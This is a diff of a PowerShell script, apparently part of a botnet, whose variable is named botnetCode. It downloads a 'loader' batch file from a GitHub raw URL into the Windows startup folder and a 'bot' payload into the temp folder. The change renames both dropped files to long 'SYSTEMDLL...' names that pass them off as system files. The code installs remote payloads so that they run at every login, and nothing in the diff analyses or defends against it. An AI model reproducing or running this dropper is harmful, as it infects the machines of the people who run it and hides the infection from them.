@@ -6,10 +6,10 @@ $botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem'; #Always
 
 $wc = [System.Net.WebClient]::new();
 $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
-$wc.DownloadFile("$loader","$startUpFolder\loader.bat");
+$wc.DownloadFile("$loader","$startUpFolder\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
 
 $bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
-$wc.DownloadFile("$bot","$temp\bot.log");
+$wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log");
 
 
 
